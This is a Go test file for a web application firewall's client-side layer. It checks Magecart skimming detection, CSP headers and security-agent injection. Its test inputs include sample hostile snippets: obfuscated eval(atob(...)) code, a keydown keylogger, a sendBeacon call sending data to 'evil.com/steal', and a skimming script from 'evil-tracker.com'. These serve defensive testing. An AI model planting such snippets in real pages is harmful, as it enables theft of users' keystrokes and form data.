package clientside

import (
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

func TestNewLayer(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true

	layer := NewLayer(cfg)

	if layer.Name() != "clientside" {
		t.Errorf("Expected layer name 'clientside', got '%s'", layer.Name())
	}

	if !layer.enabled {
		t.Error("Expected layer to be enabled")
	}

	// Check default patterns are compiled
	if layer.patterns == nil {
		t.Error("Expected patterns to be compiled")
	}
}

func TestLayer_Process_Disabled(t *testing.T) {
	layer := NewLayer(&Config{Enabled: false})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/test",
	}

	result := layer.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("Expected ActionPass when disabled, got %v", result.Action)
	}
}

func TestLayer_Process_Exclusions(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.Exclusions = []string{"/health", "/metrics"}

	layer := NewLayer(cfg)

	// Test excluded path
	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/health",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Error("Excluded path should pass")
	}

	// Test non-excluded path
	ctx.Path = "/api/users"
	result = layer.Process(ctx)
	// Should pass but may have hooks registered
	if result.Action != engine.ActionPass {
		t.Error("Non-excluded path should pass")
	}
}

func TestLayer_Process_CSP(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = false

	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/test",
		Metadata: make(map[string]any),
	}

	result := layer.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("Expected ActionPass, got %v", result.Action)
	}

	// Check CSP header registered
	if ctx.Metadata["csp_header_name"] == nil {
		t.Error("Expected CSP header name to be set")
	}

	if ctx.Metadata["clientside_csp_hook"] == nil {
		t.Error("Expected CSP hook to be registered")
	}
}

func TestAnalyzeResponseBody_ObfuscatedJS(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true

	layer := NewLayer(cfg)

	// Test obfuscated JS detection
	body := []byte(`
		<script>
			var x = eval(atob("c29tZSBjb2Rl"));
			var y = unescape("%3Cscript%3E");
		</script>
	`)

	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("Expected obfuscated JS to be detected")
	}

	if len(result.Matches) == 0 {
		t.Error("Expected matches for obfuscated JS")
	}
}

func TestAnalyzeResponseBody_Keylogger(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectKeyloggers = true

	layer := NewLayer(cfg)

	// Test keylogger detection
	body := []byte(`
		<script>
			document.addEventListener('keydown', function(e) {
				console.log(e.key);
			});
		</script>
	`)

	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("Expected keylogger to be detected")
	}

	foundKeylogger := false
	for _, match := range result.Matches {
		if match.Pattern == "keylogger" {
			foundKeylogger = true
			break
		}
	}

	if !foundKeylogger {
		t.Error("Expected keylogger pattern match")
	}
}

func TestAnalyzeResponseBody_FormExfiltration(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectFormExfiltration = true

	layer := NewLayer(cfg)

	// Test form exfiltration detection - navigator.sendBeacon pattern
	body := []byte(`
		<script>
			navigator.sendBeacon('https://evil.com/steal', JSON.stringify(data));
		</script>
	`)

	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("Expected form exfiltration to be detected")
	}
}

func TestAnalyzeResponseBody_SuspiciousDomain(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectSuspiciousDomains = true
	cfg.MagecartDetection.KnownSkimmingDomains = []string{"evil-tracker.com"}

	layer := NewLayer(cfg)

	// Test suspicious domain detection
	body := []byte(`
		<script src="https://evil-tracker.com/skim.js"></script>
	`)

	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("Expected suspicious domain to be detected")
	}

	// Check for critical severity (known skimming domain)
	foundCritical := false
	for _, match := range result.Matches {
		if match.Severity == "critical" {
			foundCritical = true
			break
		}
	}

	if !foundCritical {
		t.Error("Expected critical severity for known skimming domain")
	}
}

func TestAnalyzeResponseBody_Clean(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true

	layer := NewLayer(cfg)

	// Test clean response
	body := []byte(`
		<html>
			<body>
				<h1>Hello World</h1>
				<script>
					console.log("Normal script");
				</script>
			</body>
		</html>
	`)

	result := layer.analyzeResponseBody(body)

	if result.Detected {
		t.Error("Expected clean response to not be detected")
	}

	if result.Score != 0 {
		t.Errorf("Expected score 0 for clean response, got %d", result.Score)
	}
}

func TestInjectAgent(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "head"
	cfg.AgentInjection.MonitorDOM = true
	cfg.AgentInjection.MonitorNetwork = true

	layer := NewLayer(cfg)

	body := []byte(`<html><head></head><body>Hello</body></html>`)
	result := layer.InjectAgent(body)

	if len(result) <= len(body) {
		t.Error("Expected body to be larger after agent injection")
	}

	if !contains(result, "security-agent") {
		t.Error("Expected agent script to be injected")
	}

	if !contains(result, "MutationObserver") {
		t.Error("Expected DOM monitoring code in agent")
	}
}

func TestInjectAgent_AlreadyInjected(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.ScriptURL = "/_guardian/agent.js"

	layer := NewLayer(cfg)

	// Body already has the agent
	body := []byte(`<html><head><script src="/_guardian/agent.js"></script></head><body></body></html>`)
	result := layer.InjectAgent(body)

	if len(result) != len(body) {
		t.Error("Expected body to remain unchanged when agent already injected")
	}
}

func TestGetCSPHeader(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CSP.Enabled = true
	cfg.CSP.DefaultSrc = []string{"'self'"}
	cfg.CSP.ScriptSrc = []string{"'self'"}
	cfg.CSP.ReportOnly = false

	layer := NewLayer(cfg)

	headerName, headerValue := layer.GetCSPHeader()

	if headerName != "Content-Security-Policy" {
		t.Errorf("Expected header name 'Content-Security-Policy', got '%s'", headerName)
	}

	if headerValue == "" {
		t.Error("Expected non-empty header value")
	}

	if !containsString(headerValue, "default-src") {
		t.Error("Expected default-src directive in CSP")
	}

	if !containsString(headerValue, "script-src") {
		t.Error("Expected script-src directive in CSP")
	}
}

func TestGetCSPHeader_ReportOnly(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = true

	layer := NewLayer(cfg)

	headerName, _ := layer.GetCSPHeader()

	if headerName != "Content-Security-Policy-Report-Only" {
		t.Errorf("Expected header name 'Content-Security-Policy-Report-Only', got '%s'", headerName)
	}
}

func TestGetStats(t *testing.T) {
	layer := NewLayer(DefaultConfig())

	stats := layer.GetStats()

	if stats.ScannedResponses != 0 {
		t.Errorf("Expected 0 scanned responses, got %d", stats.ScannedResponses)
	}
}

func TestShouldInject(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.ProtectedPaths = []string{"/checkout", "/payment"}

	layer := NewLayer(cfg)

	if !layer.shouldInject("/checkout") {
		t.Error("Expected /checkout to be protected")
	}

	if !layer.shouldInject("/checkout/pay") {
		t.Error("Expected /checkout/pay to be protected")
	}

	if layer.shouldInject("/about") {
		t.Error("Expected /about to not be protected")
	}

	// Empty protected paths means all paths
	cfg.AgentInjection.ProtectedPaths = []string{}
	layer2 := NewLayer(cfg)

	if !layer2.shouldInject("/any") {
		t.Error("Expected all paths to be protected when ProtectedPaths is empty")
	}
}

func TestCompilePatterns(t *testing.T) {
	cfg := MagecartConfig{
		Enabled:                true,
		DetectObfuscatedJS:     true,
		DetectSuspiciousDomains: true,
		DetectKeyloggers:       true,
		DetectFormExfiltration: true,
		KnownSkimmingDomains:   []string{"evil.com"},
	}

	patterns := CompilePatterns(&cfg)

	if patterns == nil {
		t.Fatal("Expected patterns to be compiled")
	}

	if len(patterns.ObfuscationPatterns) == 0 {
		t.Error("Expected obfuscation patterns to be compiled")
	}

	if len(patterns.SkimmingPatterns) == 0 {
		t.Error("Expected skimming patterns to be compiled")
	}

	if len(patterns.KeyloggerPatterns) == 0 {
		t.Error("Expected keylogger patterns to be compiled")
	}

	if len(patterns.FormExfilPatterns) == 0 {
		t.Error("Expected form exfiltration patterns to be compiled")
	}

	if !patterns.KnownSkimmingDomains["evil.com"] {
		t.Error("Expected evil.com to be in known skimming domains")
	}
}

func TestDefaultKnownSkimmingDomains(t *testing.T) {
	domains := DefaultKnownSkimmingDomains()

	if len(domains) == 0 {
		t.Error("Expected default skimming domains")
	}

	// Check for known patterns
	hasJQuery := false
	for _, d := range domains {
		if containsString(d, "jquery") {
			hasJQuery = true
			break
		}
	}

	if !hasJQuery {
		t.Error("Expected jquery-related domains in default list")
	}
}

// Helper functions
func contains(data []byte, substr string) bool {
	return containsString(string(data), substr)
}

func containsString(s, substr string) bool {
	return len(s) > 0 && len(substr) > 0 && stringContains(s, substr)
}

func stringContains(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
